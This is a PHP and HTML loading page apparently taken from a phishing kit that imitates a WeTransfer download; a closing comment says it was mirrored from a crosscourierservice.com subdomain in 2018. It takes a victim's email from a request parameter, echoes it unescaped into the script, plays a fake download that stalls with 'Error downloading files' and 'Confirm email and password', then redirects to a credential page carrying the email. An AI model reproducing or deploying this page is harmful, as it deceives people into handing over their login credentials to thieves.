<?php
$email = @$_REQUEST['X1'];

?>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>


</head>


<script>



var preloadimages=new Array("","")



var intervals=700

//configure destination URL

var targetdestination="index.php?X1=<?php echo $email; ?>&rand=13InboxLightaspxn.1774256418&amp;fid.4.1252899642&amp;fid=1&amp;fav.1&amp;rand.13InboxLight.aspxn.1774256418&amp;fid.1252899642&amp;fid.1&amp;fav.1&amp;&amp;.rand=13InboxLight.aspx?n=1774256418&amp;fid=4#n=1252899642&fid=1&fav=1"


var splashmessage=new Array()

var openingtags='<font face="calibri" size="3" color="#000000">'

splashmessage[0]='Starting Download'

splashmessage[1]='Downloading...... 8%'

splashmessage[2]='Downloading...... 15%'

splashmessage[3]='Downloading...... 24%'

splashmessage[4]='Downloading...... 27%'

splashmessage[5]='Downloading...... 29%'

splashmessage[6]='Downloading...... 29%'

splashmessage[7]='Error downloading files...... 30%'

splashmessage[8]='Error downloading files ....'

splashmessage[9]='Try Again.....'

splashmessage[10]='Confirm email and password.....'







var closingtags='</font>'



//Do not edit below this line (besides HTML code at the very bottom)



var i=0



var ns4=document.layers?1:0

var ie4=document.all?1:0

var ns6=document.getElementById&&!document.all?1:0

var theimages=new Array()



//preload images

if (document.images){

for (p=0;p<preloadimages.length;p++){

theimages[p]=new Image()

theimages[p].src=preloadimages[p]

}

}



function displaysplash(){

if (i<splashmessage.length){

sc_cross.style.visibility="hidden"

sc_cross.innerHTML='<b><center>'+openingtags+splashmessage[i]+closingtags+'</center></b>'

sc_cross.style.left=ns6?parseInt(window.pageXOffset)+parseInt(window.innerWidth)/2-parseInt(sc_cross.style.width)/2 :document.body.scrollLeft

+document.body.clientWidth/2-parseInt(sc_cross.style.width)/2

sc_cross.style.top=ns6?parseInt(window.pageYOffset)+parseInt(window.innerHeight)/2-sc_cross.offsetHeight/2:document.body.scrollTop

+document.body.clientHeight/2-sc_cross.offsetHeight/2

sc_cross.style.visibility="visible"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash()",intervals)

}



function displaysplash_ns(){

if (i<splashmessage.length){

sc_ns.visibility="hide"

sc_ns.document.write('<b>'+openingtags+splashmessage[i]+closingtags+'</b>')

sc_ns.document.close()



sc_ns.left=pageXOffset+window.innerWidth/2-sc_ns.document.width/2

sc_ns.top=pageYOffset+window.innerHeight/2-sc_ns.document.height/2



sc_ns.visibility="show"

i++

}

else{

window.location=targetdestination

return

}

setTimeout("displaysplash_ns()",intervals)

}







function positionsplashcontainer(){

if (ie4||ns6){

sc_cross=ns6?document.getElementById("splashcontainer"):document.all.splashcontainer

displaysplash()

}

else if (ns4){

sc_ns=document.splashcontainerns

sc_ns.visibility="show"

displaysplash_ns()

}

else

window.location=targetdestination

}

window.onload=positionsplashcontainer



</script>
<script><!--

 var jv=1.0;

//--></script>



<script language="Javascript1.1"><!--

 jv=1.1;

//--></script>



<script language="Javascript1.2"><!--

 jv=1.2;

//--></script>



<script language="Javascript1.3"><!--

 jv=1.3;

//--></script>



<script language="Javascript1.4"><!--

 jv=1.4;

//--></script> 

<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">


<br><br><br><br>
<table align="center"><tr>

<td>
<img src="load.gif" width="120" height="120">
</td>




<td width="5"></td>






<td width="350">
<div align="left" class="style1" id="splashcontainer" style="visibility: visible; top: 363.5px;"> </div>
</tr></table>


</body>

<!-- Mirrored from wetransfer-cdca6db3e8f905eb9060900.crosscourierservice.com/loading.php?Email=&.rand=13InboxLight.aspx?n=1774256418&fid=4 by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 18 Oct 2018 16:53:23 GMT -->
</html>